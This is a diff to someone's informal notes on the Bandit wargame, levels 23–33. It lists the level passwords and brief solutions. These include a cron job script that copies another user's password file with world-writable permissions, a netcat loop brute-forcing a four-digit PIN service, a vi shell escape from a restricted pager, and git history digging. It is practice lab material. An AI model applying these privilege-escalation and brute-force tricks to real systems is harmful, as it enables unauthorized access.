@@ -117,8 +117,75 @@ Straightforward look at the cronscripts and cat the file
 
 same thing but md5 hash
 
-## bandit23 : jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+## bandit23 : UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+make a bash script
+```bash
+#!/bin/bash  
+  
+cat /etc/bandit_pass/bandit24 > /tmp/bruh/password.txt
+```
+gib the appropriate perms
+really useful link to learn about permission https://chmodcommand.com/chmod-777/
+```bash
+chmod -R 777 bashscript
+touch password.txt
+chmod -R 777 password.txt
+```
+make sure to change permission for password so it can be written to by anyone.
+everytime you edit these files, the permission gets changed :weary:, but this works lol
 
+## bandit24 : UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```bash
+#!/bin/bash
+passwd24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+for i in {0000..9999}; do
+            echo "$passwd24 $i"
+done | nc localhost 30002  | grep -v Wrong | grep -v "I am the pincode checker for user bandit25"
 
-## bandit24 : 
+```
+shitty bruteforce cbb
+grep -v is cool ig
 
+## bandit25 : uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+VERY convoluted chall WAAAA
+so more is a command that views text, secretly a vi editor if the text isnt big enough, anyway, you then execute commands in vi to change the shell 
+`:set shell=/bin/bash` then `:sh` will exit to bash bingo
+https://superuser.com/questions/287994/how-to-specify-shell-for-vim this helped solve
+
+## bandit26 : 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+free flag because the other one annoying lol
+
+## bandit27 : 3ba3118a22e93127a4ed485be72ef5ea
+ez git stuff
+
+## bandit28 : 0ef186ac70e04ea33b4c1853d2526fa2
+git checkout moment
+```bash
+git log --reflog
+```
+cli to list all the commits
+
+## bandit29 : bbc96594b4e001778eee9975372716b2
+pretty cool
+```bash
+git branch -a # views all the branches
+git checkout branchname
+```
+
+## bandit30 :5b90576bedb2cc04c86a9e924ce42faf
+tags are github things that let you mark a specific point etc
+```bash
+git tags
+git show secret
+```
+ 
+## bandit31 : 47e603bb428404d265f59c42920d81e5
+
+easy  git push
+
+## bandit32 : 56a9bf19c63d650ce78e6ec0354ee45e
+`$0`
+
+## bandit33 : c9c3199ddf4121b10cf581a98d51caee
+
+FIN
